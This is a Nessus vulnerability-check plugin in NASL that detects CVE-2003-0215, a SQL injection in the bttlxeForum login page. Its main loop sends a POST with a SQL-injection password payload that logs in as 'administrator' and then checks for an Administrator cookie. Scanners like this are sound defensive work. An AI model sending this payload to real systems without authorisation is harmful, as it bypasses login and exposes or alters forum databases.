#
# (C) Tenable Network Security, Inc.
#

# Ref:
#  Date: Wed, 23 Apr 2003 22:05:30 -0400
#  From: SecurityTracker <help@securitytracker.com>
#  To: bugtraq@securityfocus.com
#  Subject: SQL injection in BttlxeForum

include("compat.inc");

if(description)
{
 script_id(11548);
 script_version("$Revision: 1.29 $");
 script_cve_id("CVE-2003-0215");
 script_bugtraq_id(7416);
 script_osvdb_id(8444);

 script_name(english:"bttlxeForum login.asp Multiple Field SQL Injection");
 script_summary(english:"Uses a SQL query as a password");

 script_set_attribute(attribute:"synopsis", value:
"A web application running on the remote host has a SQL injection
vulnerability." );
 script_set_attribute(attribute:"description", value:
"The remote host is running bttlxeForum, a set of CGIs designed to
run a forum-based web server on Windows.

There is a SQL injection bug in the remote server that allowed
Nessus to log in as 'administrator' by supplying the password 'or id='
in a POST request.

A remote attacker may use this flaw to view and change sensitive
information in the database." );
 script_set_attribute(
   attribute:"see_also",
   value:"http://www.nessus.org/u?6c26f56c"
 );
 script_set_attribute(
   attribute:"solution", 
   value:"Apply the patch referenced in the vendor's advisory."
 );
 script_set_cvss_base_vector("CVSS2#AV:N/AC:L/Au:N/C:P/I:P/A:P");
 script_set_cvss_temporal_vector("CVSS2#E:F/RL:OF/RC:ND");
 script_set_attribute(attribute:"exploitability_ease", value:"Exploits are available");
 script_set_attribute(attribute:"exploit_available", value:"true");
 script_set_attribute(attribute:"plugin_publication_date", value: "2003/04/24");
 script_set_attribute(attribute:"vuln_publication_date", value: "2003/04/24");
 script_cvs_date("$Date: 2017/02/21 14:37:31 $");
 script_set_attribute(attribute:"plugin_type", value:"remote");
 script_end_attributes();

 script_category(ACT_ATTACK);
 script_family(english:"CGI abuses");
 script_copyright(english:"This script is Copyright (C) 2003-2017 Tenable Network Security, Inc.");
 script_dependencie("http_version.nasl");
 script_require_ports("Services/www", 80);
 script_exclude_keys("Settings/disable_cgi_scanning");
 script_require_keys("www/ASP");
 exit(0);
}

include("global_settings.inc");
include("misc_func.inc");
include("http.inc");

port = get_http_port(default:80, asp: 1);

enable_cookiejar();

foreach d (cgi_dirs())
{
 u = d + "/myaccount/login.asp";
 if (is_cgi_installed3(item: u, port:port))
 {
  h = make_array( "Content-Type", "application/x-www-form-urlencoded",
       		    "Accept", "*/*",
		    "Referer", build_url(port: port, qs: u, host: get_host_name()));
  r = http_send_recv3(port: port, method: 'POST', item: u,
       data: "userid=administrator&password=+%27or%27%27%3D%27+&cookielogin=cookielogin&Submit=Log+In", 
       exit_on_fail: 1, add_headers: h );

  if (get_http_cookie(name: "ForumMemberLevel", path: "/") == "Administrator")
  {
   security_hole(port);
   set_kb_item(name: 'www/'+port+'/SQLInjection', value: TRUE);
   exit(0);
  }
 }
}
